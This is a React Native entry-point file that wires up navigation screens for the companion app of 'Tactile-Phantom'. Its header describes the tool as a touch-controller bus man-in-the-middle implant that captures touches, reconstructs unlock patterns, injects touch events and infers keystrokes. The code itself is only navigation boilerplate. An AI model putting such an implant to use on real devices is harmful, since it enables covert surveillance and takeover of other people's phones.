/**
 * Tactile-Phantom — Companion App
 * App.tsx — React Native entry point and navigation setup
 *
 * Author: jayis1
 * License: GPL-2.0
 *
 * The companion app provides the operator interface for the Tactile-Phantom
 * touch-controller bus MITM implant. It connects over BLE to the ESP32-C3
 * module on the device and provides:
 *   - Live touch capture visualization
 *   - Event log with search/filter
 *   - Unlock pattern reconstruction
 *   - Touch event injection console
 *   - Layout manager for keystroke inference
 *   - SD card storage browser
 *   - Settings and firmware update
 */

import React from 'react';
import { StatusBar } from 'expo-status-bar';
import { NavigationContainer } from '@react-navigation/native';
import { createStackNavigator } from '@react-navigation/stack';
import { SafeAreaProvider } from 'react-native-safe-area-context';

import ConnectScreen from './screens/ConnectScreen';
import LiveCaptureScreen from './screens/LiveCaptureScreen';
import EventLogScreen from './screens/EventLogScreen';
import PatternReconstructScreen from './screens/PatternReconstructScreen';
import InjectionConsoleScreen from './screens/InjectionConsoleScreen';
import LayoutManagerScreen from './screens/LayoutManagerScreen';
import StorageScreen from './screens/StorageScreen';
import SettingsScreen from './screens/SettingsScreen';

export type RootStackParamList = {
  Connect: undefined;
  LiveCapture: undefined;
  EventLog: undefined;
  PatternReconstruct: undefined;
  InjectionConsole: undefined;
  LayoutManager: undefined;
  Storage: undefined;
  Settings: undefined;
};

const Stack = createStackNavigator<RootStackParamList>();

export default function App() {
  return (
    <SafeAreaProvider>
      <NavigationContainer>
        <StatusBar style="dark" />
        <Stack.Navigator
          initialRouteName="Connect"
          screenOptions={{
            headerStyle: { backgroundColor: '#1a1a2e' },
            headerTintColor: '#e0e0e0',
            headerTitleStyle: { fontWeight: 'bold' },
            cardStyle: { backgroundColor: '#0f0f1a' },
          }}
        >
          <Stack.Screen
            name="Connect"
            component={ConnectScreen}
            options={{ title: 'Tactile-Phantom' }}
          />
          <Stack.Screen
            name="LiveCapture"
            component={LiveCaptureScreen}
            options={{ title: 'Live Capture' }}
          />
          <Stack.Screen
            name="EventLog"
            component={EventLogScreen}
            options={{ title: 'Event Log' }}
          />
          <Stack.Screen
            name="PatternReconstruct"
            component={PatternReconstructScreen}
            options={{ title: 'Pattern Reconstruct' }}
          />
          <Stack.Screen
            name="InjectionConsole"
            component={InjectionConsoleScreen}
            options={{ title: 'Injection Console' }}
          />
          <Stack.Screen
            name="LayoutManager"
            component={LayoutManagerScreen}
            options={{ title: 'Layout Manager' }}
          />
          <Stack.Screen
            name="Storage"
            component={StorageScreen}
            options={{ title: 'Storage' }}
          />
          <Stack.Screen
            name="Settings"
            component={SettingsScreen}
            options={{ title: 'Settings' }}
          />
        </Stack.Navigator>
      </NavigationContainer>
    </SafeAreaProvider>
  );
}